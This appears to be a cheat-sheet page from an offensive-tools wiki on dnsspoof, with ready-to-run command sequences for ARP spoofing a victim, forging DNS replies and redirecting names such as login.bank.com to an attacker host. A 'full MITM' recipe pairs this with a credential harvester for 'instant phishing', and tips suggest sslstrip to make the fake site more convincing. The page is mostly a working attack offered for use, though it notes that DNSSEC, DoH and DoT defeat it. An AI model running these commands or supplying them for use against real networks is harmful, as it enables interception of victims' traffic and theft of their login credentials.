# dnsspoof — forge DNS replies on a LAN

> **Part of dsniff.** Watches for DNS queries and sends fake A-record answers faster than the real server.

**Install check:** `dnsspoof -h`

---

## 🎯 Cheat-flow

```bash
# 1. Write a hosts file: <attacker-IP>  <hostname>
cat > hosts.txt <<EOF
10.0.0.100  *.target.com
10.0.0.100  login.bank.com
EOF

# 2. Be in the path (ARP spoof first or be on same hub)
sudo arpspoof -i eth0 -t <victim> <gateway>

# 3. Start the DNS hijack
sudo dnsspoof -i eth0 -f hosts.txt
```

Now any DNS query from the victim for those names returns your IP. Host a [setoolkit](setoolkit.md) credential harvester on port 80 → instant phishing.

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-i <iface>` | Interface |
| `-f <hosts>` | Hosts file (`IP  name` per line, wildcards supported) |
| `<expr>` | BPF expression to limit which queries are spoofed |

---

## 📋 Recipe — full MITM + captive portal

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 10.0.0.50 10.0.0.1 &
sudo arpspoof -i eth0 -t 10.0.0.1 10.0.0.50 &
echo "10.0.0.100 *"  > hosts.txt           # match all names
sudo dnsspoof -i eth0 -f hosts.txt
# Meanwhile:
sudo python3 -m http.server 80             # or setoolkit
```

---

## ⚠️ Gotchas

- **You must win the race** against the real DNS server — works best when you're between victim and gateway, or on a hub.
- DNSSEC, DoH (DNS-over-HTTPS), DoT (DNS-over-TLS) all defeat dnsspoof.
- HTTPS sites will produce cert warnings — combine with [bettercap](bettercap.md) / sslstrip for more realism.
- Modern alternative: [bettercap](bettercap.md)'s `dns.spoof` module.

---

## 🔗 Related

- [arpspoof](arpspoof.md) · [ettercap](ettercap.md) · [bettercap](bettercap.md) · [setoolkit](setoolkit.md)
